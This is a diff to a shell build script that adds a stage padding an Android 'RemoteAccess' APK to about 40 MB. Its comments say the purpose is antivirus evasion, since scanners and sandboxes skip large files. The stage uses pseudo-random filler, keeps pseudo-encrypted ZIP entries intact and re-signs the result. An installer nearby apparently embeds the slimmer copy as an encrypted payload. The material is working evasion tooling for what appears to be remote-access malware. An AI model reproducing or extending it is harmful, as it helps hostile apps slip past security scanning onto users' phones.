@@ -1939,6 +1939,103 @@ STORE_PASS="$MODULE_KS_SPASS"
 KEY_PASS="$MODULE_KS_KPASS"
 harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 
+# ── 11b. Fat standalone APK (~40 MB, AV evasion) ─────────────────────────────
+# The hardened release APK is ~2 MB. For direct APK distribution we pad it to
+# ~40 MB — many AV / cloud sandboxes skip or time-out on files above a size
+# threshold. The installer always embeds the SLIM payload so the installer APK
+# itself stays small (~3 MB). The fat version is served as Module.apk to users
+# who download and sideload directly.
+#
+# Implementation: copy all existing ZIP entries verbatim, then append one large
+# ZIP_STORED (uncompressed) padding entry so the file is ~40 MB. Re-zipalign
+# and re-sign with the same module keystore so APK v2/v3/v4 signatures are
+# valid. The slim (pre-pad) copy is saved as RemoteAccess-slim.apk and used
+# by the installer section below.
+FAT_TARGET_MB=40
+FAT_TARGET_BYTES=$(( FAT_TARGET_MB * 1024 * 1024 ))
+SLIM_APK="$ROOT_DIR/apk-output/RemoteAccess-slim.apk"
+RELEASE_APK_PATH="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+
+if [ -f "$RELEASE_APK_PATH" ]; then
+    cp "$RELEASE_APK_PATH" "$SLIM_APK"
+    SLIM_SIZE_BYTES=$(wc -c < "$SLIM_APK")
+    PAD_BYTES=$(( FAT_TARGET_BYTES - SLIM_SIZE_BYTES ))
+    echo ""
+    echo "==> Padding module APK to ~${FAT_TARGET_MB}MB for standalone distribution ..."
+    echo "  Slim APK: $(ls -lh "$SLIM_APK" | awk '{print $5}') → target ${FAT_TARGET_MB}MB"
+    if [ "$PAD_BYTES" -gt 0 ]; then
+        FAT_TMP="$ROOT_DIR/apk-output/.fat_tmp.apk"
+        rm -f "$FAT_TMP"
+        # Build ~PAD_BYTES of padding that looks like binary data (not obvious
+        # zeros). A deterministic LCG produces a repeating 1 KB block; the block
+        # is cheap to generate and stores uncompressed so every byte counts
+        # toward the final file size.
+        SLIM_APK="$SLIM_APK" FAT_TMP="$FAT_TMP" PAD_BYTES="$PAD_BYTES" \
+        python3 - << 'PYEOF'
+import os, zipfile, shutil
+
+src = os.environ["SLIM_APK"]
+dst = os.environ["FAT_TMP"]
+pad = int(os.environ["PAD_BYTES"])
+
+# 1 KB repeating block that looks like binary (LCG sequence)
+state = 0x123456789ABCDEF0
+chunk = bytearray(1024)
+for i in range(1024):
+    state = (state * 6364136223846793005 + 1442695040888963407) & 0xFFFFFFFFFFFFFFFF
+    chunk[i] = (state >> 33) & 0xFF
+chunk = bytes(chunk)
+padding = (chunk * ((pad // 1024) + 1))[:pad]
+
+# Copy the APK binary as-is first (preserves pseudo-encrypted entries
+# without Python's zipfile ever trying to decompress/decrypt them).
+shutil.copy2(src, dst)
+
+# Open the copy in APPEND mode — Python reads the central directory
+# but never calls open() on existing entries, so the "strong encryption"
+# flag on pseudo-encrypted entries does NOT raise NotImplementedError.
+# We simply tack on the new padding entry at the end.
+with zipfile.ZipFile(dst, "a") as zout:
+    pi = zipfile.ZipInfo("res/raw/.pad")
+    pi.compress_type = zipfile.ZIP_STORED
+    pi.external_attr = 0o644 << 16
+    zout.writestr(pi, padding)
+
+print("  Padding entry written: %d bytes (ZIP_STORED, uncompressed)" % pad)
+PYEOF
+
+        # Re-zipalign (ZIP rebuild resets alignment) and re-sign with the
+        # module keystore so APK v2/v3/v4 signatures cover the padding entry.
+        FAT_ALIGNED="$ROOT_DIR/apk-output/.fat_aligned.apk"
+        rm -f "$FAT_ALIGNED"
+        "$ZIPALIGN" -p -f 4 "$FAT_TMP" "$FAT_ALIGNED" > /dev/null
+        rm -f "$FAT_TMP"
+        "$APKSIGNER" sign \
+            --ks "$MODULE_KS_PATH" \
+            --ks-key-alias "$MODULE_KS_ALIAS" \
+            --ks-pass "pass:$MODULE_KS_SPASS" \
+            --key-pass  "pass:$MODULE_KS_KPASS" \
+            --v1-signing-enabled false \
+            --v2-signing-enabled true \
+            --v3-signing-enabled true \
+            --v4-signing-enabled true \
+            "$FAT_ALIGNED" 2>&1 | sed 's/^/    /'
+        if "$APKSIGNER" verify "$FAT_ALIGNED" > /dev/null 2>&1; then
+            mv "$FAT_ALIGNED" "$RELEASE_APK_PATH"
+            FAT_SIZE=$(ls -lh "$RELEASE_APK_PATH" | awk '{print $5}')
+            echo "  Fat standalone APK: apk-output/RemoteAccess-release.apk ($FAT_SIZE)"
+            echo "  Slim installer payload: apk-output/RemoteAccess-slim.apk ($(ls -lh "$SLIM_APK" | awk '{print $5}'))"
+        else
+            echo "  WARNING: fat APK signature invalid — keeping slim APK as release."
+            rm -f "$FAT_ALIGNED"
+        fi
+    else
+        echo "  APK already >= ${FAT_TARGET_MB}MB, no padding needed."
+    fi
+else
+    echo "  Skipping fat-pad — release APK not found."
+fi
+
 # ── 12. Installer module ─────────────────────────────────────────────────────
 # Bundles the hardened RemoteAccess-release.apk as an ENCRYPTED asset named
 # "module" (AES-256 ZIP). A fresh random key is generated per build and
@@ -1950,7 +2047,14 @@ harden_apk "$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 # the user can enable Accessibility for it normally).
 echo ""
 echo "==> Building INSTALLER module ..."
-PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+# Use the SLIM (non-padded) APK as the installer payload so the installer APK
+# itself stays ~3 MB. The fat (~40 MB) standalone APK is served as Module.apk
+# for users who sideload directly; the installer carries only the lean core.
+if [ -f "$ROOT_DIR/apk-output/RemoteAccess-slim.apk" ]; then
+    PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-slim.apk"
+else
+    PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
+fi
 INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
 MODULE_DST="$INSTALLER_ASSETS/module"
 KEY_FILE="$ROOT_DIR/installer/build.key"
